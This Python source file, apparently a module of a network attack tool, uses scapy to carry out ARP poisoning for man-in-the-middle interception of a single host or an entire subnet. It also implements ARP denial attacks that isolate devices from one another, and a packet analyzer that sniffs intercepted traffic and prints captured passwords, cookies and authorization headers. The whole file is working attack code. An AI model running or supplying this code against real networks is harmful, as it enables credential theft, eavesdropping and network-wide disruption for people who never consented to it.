from scapy.all import ARP, Ether, srp, send, sniff, conf
import threading
import time
import sys
import click
from typing import Optional, Tuple, List, Callable, Dict, Any
import ipaddress
import socket
import os


class ARPPoisoner:
    """ARP poisoning module for Man-in-the-Middle attacks."""

    def __init__(self):
        self.poisoning = False
        self.packet_count = 0
        self.original_mac_table = {}
        self.poison_threads = []

    def get_mac(self, ip: str) -> Optional[str]:
        """Get MAC address for given IP."""
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            answered = srp(broadcast / arp_request, timeout=2, verbose=False)[0]

            if answered:
                return answered[0][1].hwsrc
        except Exception as e:
            click.echo(click.style(f"Error getting MAC for {ip}: {e}", fg="red"))
        return None

    def enable_ip_forwarding(self) -> bool:
        """Enable IP forwarding to allow packet routing."""
        try:
            if sys.platform == "linux" or sys.platform == "linux2":
                # Linux
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("1")
                click.echo(click.style("IP forwarding enabled on Linux", fg="green"))
                return True
            elif sys.platform == "darwin":
                # macOS
                os.system("sudo sysctl -w net.inet.ip.forwarding=1")
                click.echo(click.style("IP forwarding enabled on macOS", fg="green"))
                return True
            elif sys.platform == "win32":
                # Windows
                click.echo(
                    click.style(
                        "Please enable IP forwarding manually on Windows", fg="yellow"
                    )
                )
                return False
        except Exception as e:
            click.echo(click.style(f"Error enabling IP forwarding: {e}", fg="red"))
            return False

    def disable_ip_forwarding(self) -> None:
        """Disable IP forwarding."""
        try:
            if sys.platform == "linux" or sys.platform == "linux2":
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("0")
            elif sys.platform == "darwin":
                os.system("sudo sysctl -w net.inet.ip.forwarding=0")
            click.echo(click.style("IP forwarding disabled", fg="yellow"))
        except Exception as e:
            click.echo(click.style(f"Error disabling IP forwarding: {e}", fg="red"))

    def create_poison_packet(self, target_ip: str, spoofed_ip: str) -> ARP:
        """Create ARP poison packet."""
        packet = ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
        return packet

    def poison_target(
        self, target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str
    ) -> None:
        """Continuously poison target and gateway."""
        while self.poisoning:
            try:
                # Poison target (tell target that we are the gateway)
                poison_target = self.create_poison_packet(target_ip, gateway_ip)
                send(poison_target, verbose=False)

                # Poison gateway (tell gateway that we are the target)
                poison_gateway = self.create_poison_packet(gateway_ip, target_ip)
                send(poison_gateway, verbose=False)

                time.sleep(2)
            except Exception as e:
                click.echo(click.style(f"Error in poison thread: {e}", fg="red"))
                break

    def restore_arp_tables(
        self, target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str
    ) -> None:
        """Restore original ARP tables."""
        click.echo(click.style("\nRestoring ARP tables...", fg="yellow"))

        # Create restoration packets
        restore_target = ARP(
            op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=gateway_mac
        )
        restore_gateway = ARP(
            op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=target_mac
        )

        # Send restoration packets multiple times to ensure they're received
        for _ in range(5):
            send(restore_target, verbose=False)
            send(restore_gateway, verbose=False)
            time.sleep(0.5)

        click.echo(click.style("ARP tables restored", fg="green"))

    def denial_attack(
        self, victim1_ip: str, victim2_ip: str, bidirectional: bool = True
    ) -> None:
        """Continuously send fake ARP replies to perform denial attack."""
        while self.poisoning:
            try:
                # Create packets with non-existent MAC addresses
                fake_mac = "00:00:00:00:00:00"

                # Tell victim1 that victim2 has a fake MAC
                poison_victim1 = ARP(
                    op=2, pdst=victim1_ip, psrc=victim2_ip, hwsrc=fake_mac
                )
                send(poison_victim1, verbose=False)

                if bidirectional:
                    # Tell victim2 that victim1 has a fake MAC
                    poison_victim2 = ARP(
                        op=2, pdst=victim2_ip, psrc=victim1_ip, hwsrc=fake_mac
                    )
                    send(poison_victim2, verbose=False)

                time.sleep(2)
            except Exception as e:
                click.echo(click.style(f"Error in denial thread: {e}", fg="red"))
                break

    def start_denial(
        self, victim1_ip: str, victim2_ip: str, bidirectional: bool = True
    ) -> bool:
        """Start ARP denial attack between two hosts."""
        click.echo(click.style(f"\nVictim 1 IP: {victim1_ip}", fg="cyan"))
        click.echo(click.style(f"Victim 2 IP: {victim2_ip}", fg="cyan"))
        click.echo(
            click.style(
                f"Mode: {'Bidirectional' if bidirectional else 'Unidirectional'}",
                fg="cyan",
            )
        )

        # Verify both victims are reachable
        victim1_mac = self.get_mac(victim1_ip)
        victim2_mac = self.get_mac(victim2_ip)

        if not victim1_mac:
            click.echo(
                click.style(
                    f"Could not find MAC address for victim 1 ({victim1_ip})", fg="red"
                )
            )
            return False

        if not victim2_mac:
            click.echo(
                click.style(
                    f"Could not find MAC address for victim 2 ({victim2_ip})", fg="red"
                )
            )
            return False

        click.echo(click.style(f"Victim 1 MAC: {victim1_mac}", fg="cyan"))
        click.echo(click.style(f"Victim 2 MAC: {victim2_mac}", fg="cyan"))

        # Store original MAC addresses for restoration
        self.original_mac_table[victim1_ip] = victim1_mac
        self.original_mac_table[victim2_ip] = victim2_mac

        # Start denial attack
        self.poisoning = True
        denial_thread = threading.Thread(
            target=self.denial_attack, args=(victim1_ip, victim2_ip, bidirectional)
        )
        denial_thread.daemon = True
        denial_thread.start()
        self.poison_threads.append(denial_thread)

        click.echo(click.style("\nARP denial attack started!", fg="green"))
        click.echo(
            click.style("Communication between victims is now blocked", fg="yellow")
        )
        click.echo(click.style("Press Ctrl+C to stop", fg="yellow"))

        return True

    def stop_denial(self, victim1_ip: str, victim2_ip: str) -> None:
        """Stop ARP denial attack and restore connectivity."""
        self.poisoning = False

        # Wait for denial threads to stop
        for thread in self.poison_threads:
            thread.join(timeout=3)

        # Restore ARP tables
        if (
            victim1_ip in self.original_mac_table
            and victim2_ip in self.original_mac_table
        ):
            click.echo(click.style("\nRestoring ARP tables...", fg="yellow"))

            victim1_mac = self.original_mac_table[victim1_ip]
            victim2_mac = self.original_mac_table[victim2_ip]

            # Restore victim1's ARP entry for victim2
            restore_victim1 = ARP(
                op=2,
                pdst=victim1_ip,
                psrc=victim2_ip,
                hwdst=victim1_mac,
                hwsrc=victim2_mac,
            )
            # Restore victim2's ARP entry for victim1
            restore_victim2 = ARP(
                op=2,
                pdst=victim2_ip,
                psrc=victim1_ip,
                hwdst=victim2_mac,
                hwsrc=victim1_mac,
            )

            # Send restoration packets multiple times
            for _ in range(5):
                send(restore_victim1, verbose=False)
                send(restore_victim2, verbose=False)
                time.sleep(0.5)

            click.echo(
                click.style(
                    "ARP tables restored - connectivity should be restored", fg="green"
                )
            )

        click.echo(click.style("\nARP denial attack stopped", fg="green"))

    def start_poisoning(
        self,
        target_ip: Optional[str] = None,
        gateway_ip: Optional[str] = None,
        packet_callback: Optional[Callable] = None,
    ) -> bool:
        """Start ARP poisoning attack."""
        # Get gateway IP if not provided
        if gateway_ip is None:
            gateway_ip = conf.route.route("0.0.0.0")[2]

        # If no target specified, poison all devices on network
        if target_ip is None:
            return self._poison_all_network(gateway_ip, packet_callback)

        click.echo(click.style(f"\nTarget IP: {target_ip}", fg="cyan"))
        click.echo(click.style(f"Gateway IP: {gateway_ip}", fg="cyan"))

        # Get MAC addresses
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)

        if not target_mac:
            click.echo(
                click.style(
                    f"Could not find MAC address for target {target_ip}", fg="red"
                )
            )
            return False

        if not gateway_mac:
            click.echo(
                click.style(
                    f"Could not find MAC address for gateway {gateway_ip}", fg="red"
                )
            )
            return False

        click.echo(click.style(f"Target MAC: {target_mac}", fg="cyan"))
        click.echo(click.style(f"Gateway MAC: {gateway_mac}", fg="cyan"))

        # Store original MAC addresses
        self.original_mac_table[target_ip] = target_mac
        self.original_mac_table[gateway_ip] = gateway_mac

        # Enable IP forwarding
        if not self.enable_ip_forwarding():
            click.echo(
                click.style(
                    "Warning: IP forwarding not enabled, packets will be dropped!",
                    fg="red",
                )
            )

        # Start poisoning
        self.poisoning = True
        poison_thread = threading.Thread(
            target=self.poison_target,
            args=(target_ip, gateway_ip, target_mac, gateway_mac),
        )
        poison_thread.daemon = True
        poison_thread.start()
        self.poison_threads.append(poison_thread)

        click.echo(click.style("\nARP poisoning started!", fg="green"))
        click.echo(click.style("Press Ctrl+C to stop", fg="yellow"))

        # Start packet sniffing if callback provided
        if packet_callback:
            self._sniff_packets(target_ip, packet_callback)

        return True

    def stop_poisoning(
        self, target_ip: Optional[str] = None, gateway_ip: Optional[str] = None
    ) -> None:
        """Stop ARP poisoning and restore ARP tables."""
        self.poisoning = False

        if gateway_ip is None:
            gateway_ip = conf.route.route("0.0.0.0")[2]

        # Wait for poison threads to stop
        for thread in self.poison_threads:
            thread.join(timeout=3)

        # Restore ARP tables
        if (
            target_ip
            and target_ip in self.original_mac_table
            and gateway_ip in self.original_mac_table
        ):
            # Single target restoration
            self.restore_arp_tables(
                target_ip,
                gateway_ip,
                self.original_mac_table[target_ip],
                self.original_mac_table[gateway_ip],
            )
        else:
            # Restore all devices
            click.echo(
                click.style("\nRestoring ARP tables for all devices...", fg="yellow")
            )
            gateway_mac = self.original_mac_table.get(gateway_ip)
            if gateway_mac:
                for ip, mac in self.original_mac_table.items():
                    if ip != gateway_ip:
                        # Restore target
                        restore_target = ARP(
                            op=2, pdst=ip, psrc=gateway_ip, hwdst=mac, hwsrc=gateway_mac
                        )
                        # Restore gateway
                        restore_gateway = ARP(
                            op=2, pdst=gateway_ip, psrc=ip, hwdst=gateway_mac, hwsrc=mac
                        )

                        for _ in range(3):
                            send(restore_target, verbose=False)
                            send(restore_gateway, verbose=False)

                click.echo(
                    click.style("ARP tables restored for all devices", fg="green")
                )

        # Disable IP forwarding
        self.disable_ip_forwarding()

        click.echo(click.style("\nARP poisoning stopped", fg="green"))

    def _sniff_packets(self, target_ip: str, callback: Callable) -> None:
        """Sniff packets from the target."""

        def packet_filter(packet):
            if packet.haslayer("IP"):
                if (
                    target_ip == "all"
                    or packet["IP"].src == target_ip
                    or packet["IP"].dst == target_ip
                ):
                    self.packet_count += 1
                    callback(packet)

        try:
            sniff(
                prn=packet_filter, store=False, stop_filter=lambda _: not self.poisoning
            )
        except Exception as e:
            click.echo(click.style(f"Error in packet sniffing: {e}", fg="red"))

    def _get_network_devices(self, network: str = None) -> List[Tuple[str, str]]:
        """Get all devices on the network."""
        if network is None:
            gw = conf.route.route("0.0.0.0")[2]
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((gw, 80))
            local_ip = s.getsockname()[0]
            s.close()
            network = str(ipaddress.IPv4Network(f"{local_ip}/24", strict=False))

        click.echo(
            click.style(f"Scanning network {network} for devices...", fg="yellow")
        )

        arp_request = ARP(pdst=network)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        result = srp(broadcast / arp_request, timeout=2, verbose=False)[0]

        devices = []
        gateway = conf.route.route("0.0.0.0")[2]
        for _, received in result:
            if received.psrc != gateway:  # Skip gateway
                devices.append((received.psrc, received.hwsrc))

        return devices

    def _poison_all_network(
        self, gateway_ip: str, packet_callback: Optional[Callable] = None
    ) -> bool:
        """Poison all devices on the network."""
        click.echo(click.style("\n⚠️  POISONING ENTIRE NETWORK!", fg="red", bold=True))

        # Get gateway MAC
        gateway_mac = self.get_mac(gateway_ip)
        if not gateway_mac:
            click.echo(
                click.style(
                    f"Could not find MAC address for gateway {gateway_ip}", fg="red"
                )
            )
            return False

        # Get all network devices
        devices = self._get_network_devices()
        if not devices:
            click.echo(click.style("No devices found on network", fg="red"))
            return False

        click.echo(click.style(f"\nFound {len(devices)} devices to poison:", fg="cyan"))
        for ip, mac in devices:
            click.echo(f"  - {ip} ({mac})")

        # Store original MAC addresses
        self.original_mac_table[gateway_ip] = gateway_mac
        for ip, mac in devices:
            self.original_mac_table[ip] = mac

        # Enable IP forwarding
        if not self.enable_ip_forwarding():
            click.echo(
                click.style(
                    "Warning: IP forwarding not enabled, packets will be dropped!",
                    fg="red",
                )
            )

        # Start poisoning all devices
        self.poisoning = True

        def poison_all_targets():
            while self.poisoning:
                try:
                    # Poison each device
                    for target_ip, target_mac in devices:
                        # Tell target that we are the gateway
                        poison_target = self.create_poison_packet(target_ip, gateway_ip)
                        send(poison_target, verbose=False)

                        # Tell gateway that we are the target
                        poison_gateway = self.create_poison_packet(
                            gateway_ip, target_ip
                        )
                        send(poison_gateway, verbose=False)

                    time.sleep(2)
                except Exception as e:
                    click.echo(click.style(f"Error in poison thread: {e}", fg="red"))
                    break

        poison_thread = threading.Thread(target=poison_all_targets)
        poison_thread.daemon = True
        poison_thread.start()
        self.poison_threads.append(poison_thread)

        click.echo(
            click.style(
                f"\nARP poisoning started for {len(devices)} devices!", fg="green"
            )
        )
        click.echo(click.style("Press Ctrl+C to stop", fg="yellow"))

        # Start packet sniffing if callback provided
        if packet_callback:
            self._sniff_packets("all", packet_callback)

        return True

    def start_deny_all_network(self, network: str = None) -> bool:
        """Start ARP denial attack to block all devices from communicating with each other."""
        click.echo(
            click.style(
                "\n⚠️  STARTING NETWORK-WIDE DENIAL ATTACK!", fg="red", bold=True
            )
        )

        # Get all network devices
        devices = self._get_network_devices(network)
        if not devices:
            click.echo(click.style("No devices found on network", fg="red"))
            return False

        click.echo(click.style(f"\nFound {len(devices)} devices to deny:", fg="cyan"))
        for ip, mac in devices:
            click.echo(f"  - {ip} ({mac})")

        # Store original MAC addresses
        for ip, mac in devices:
            self.original_mac_table[ip] = mac

        # Start denial attack
        self.poisoning = True

        def deny_all_communications():
            fake_mac = "00:00:00:00:00:00"
            while self.poisoning:
                try:
                    # For each pair of devices, poison their ARP tables
                    for i, (ip1, mac1) in enumerate(devices):
                        for j, (ip2, mac2) in enumerate(devices):
                            if i != j:  # Don't poison a device against itself
                                # Tell ip1 that ip2 has a fake MAC
                                poison_packet = ARP(
                                    op=2, pdst=ip1, psrc=ip2, hwsrc=fake_mac
                                )
                                send(poison_packet, verbose=False)

                    time.sleep(2)
                except Exception as e:
                    click.echo(click.style(f"Error in deny all thread: {e}", fg="red"))
                    break

        denial_thread = threading.Thread(target=deny_all_communications)
        denial_thread.daemon = True
        denial_thread.start()
        self.poison_threads.append(denial_thread)

        click.echo(click.style("\nNetwork-wide denial attack started!", fg="green"))
        click.echo(
            click.style(
                f"All {len(devices)} devices are now isolated from each other",
                fg="yellow",
            )
        )
        click.echo(click.style("Press Ctrl+C to stop", fg="yellow"))

        return True

    def stop_deny_all_network(self) -> None:
        """Stop network-wide ARP denial attack and restore connectivity."""
        self.poisoning = False

        # Wait for denial threads to stop
        for thread in self.poison_threads:
            thread.join(timeout=3)

        # Restore ARP tables for all devices
        click.echo(
            click.style("\nRestoring ARP tables for all devices...", fg="yellow")
        )

        devices = [(ip, mac) for ip, mac in self.original_mac_table.items()]

        # Restore communication between all pairs
        for i, (ip1, mac1) in enumerate(devices):
            for j, (ip2, mac2) in enumerate(devices):
                if i != j:
                    # Restore ip1's ARP entry for ip2
                    restore_packet = ARP(
                        op=2, pdst=ip1, psrc=ip2, hwdst=mac1, hwsrc=mac2
                    )
                    send(restore_packet, verbose=False)

        # Send multiple times to ensure restoration
        for _ in range(4):
            time.sleep(0.5)
            for i, (ip1, mac1) in enumerate(devices):
                for j, (ip2, mac2) in enumerate(devices):
                    if i != j:
                        restore_packet = ARP(
                            op=2, pdst=ip1, psrc=ip2, hwdst=mac1, hwsrc=mac2
                        )
                        send(restore_packet, verbose=False)

        click.echo(
            click.style(
                "ARP tables restored - network connectivity should be restored",
                fg="green",
            )
        )
        click.echo(click.style("\nNetwork-wide denial attack stopped", fg="green"))


class PacketAnalyzer:
    """Analyze intercepted packets."""

    @staticmethod
    def analyze_http(packet) -> Optional[Dict[str, Any]]:
        """Extract HTTP information from packet."""
        if packet.haslayer("Raw"):
            payload = packet["Raw"].load.decode("utf-8", errors="ignore")

            # Check for HTTP request
            if payload.startswith(("GET", "POST", "PUT", "DELETE")):
                lines = payload.split("\r\n")
                method, url, version = lines[0].split(" ", 2)

                headers = {}
                for line in lines[1:]:
                    if ": " in line:
                        key, value = line.split(": ", 1)
                        headers[key] = value
                    elif line == "":
                        break

                return {
                    "type": "HTTP Request",
                    "method": method,
                    "url": url,
                    "host": headers.get("Host", "Unknown"),
                    "user_agent": headers.get("User-Agent", "Unknown"),
                }
        return None

    @staticmethod
    def analyze_credentials(packet) -> Optional[Dict[str, Any]]:
        """Look for potential credentials in packet."""
        if packet.haslayer("Raw"):
            payload = packet["Raw"].load.decode("utf-8", errors="ignore").lower()

            # Common credential patterns
            cred_patterns = [
                "password=",
                "pass=",
                "pwd=",
                "passwd=",
                "user=",
                "username=",
                "login=",
                "email=",
                "auth=",
                "authorization:",
                "cookie:",
            ]

            for pattern in cred_patterns:
                if pattern in payload:
                    return {
                        "type": "Potential Credentials",
                        "pattern": pattern,
                        "preview": payload[:200],
                    }
        return None

    @staticmethod
    def analyze_dns(packet) -> Optional[Dict[str, Any]]:
        """Extract DNS queries from packet."""
        if packet.haslayer("DNS") and packet["DNS"].qr == 0:  # DNS query
            query = packet["DNS"].qd.qname.decode("utf-8")
            return {"type": "DNS Query", "domain": query}
        return None


def create_packet_callback(show_all: bool = False) -> Callable:
    """Create packet callback function for analysis."""
    analyzer = PacketAnalyzer()
    seen_requests = set()

    def callback(packet):
        try:
            # Analyze HTTP
            http_info = analyzer.analyze_http(packet)
            if http_info:
                request_key = (
                    f"{http_info['method']} {http_info['host']}{http_info['url']}"
                )
                if request_key not in seen_requests:
                    seen_requests.add(request_key)
                    click.echo(
                        click.style(
                            f"\n[HTTP] {http_info['method']} {http_info['host']}{http_info['url']}",
                            fg="green",
                        )
                    )
                    if show_all:
                        click.echo(f"  User-Agent: {http_info['user_agent']}")

            # Analyze credentials
            cred_info = analyzer.analyze_credentials(packet)
            if cred_info:
                click.echo(
                    click.style(
                        f"\n[CREDENTIALS] Found {cred_info['pattern']}",
                        fg="red",
                        bold=True,
                    )
                )
                click.echo(f"  Preview: {cred_info['preview']}")

            # Analyze DNS
            if show_all:
                dns_info = analyzer.analyze_dns(packet)
                if dns_info:
                    click.echo(
                        click.style(f"[DNS] Query: {dns_info['domain']}", fg="blue")
                    )

        except Exception as e:
            if show_all:
                click.echo(click.style(f"Error analyzing packet: {e}", fg="red"))

    return callback
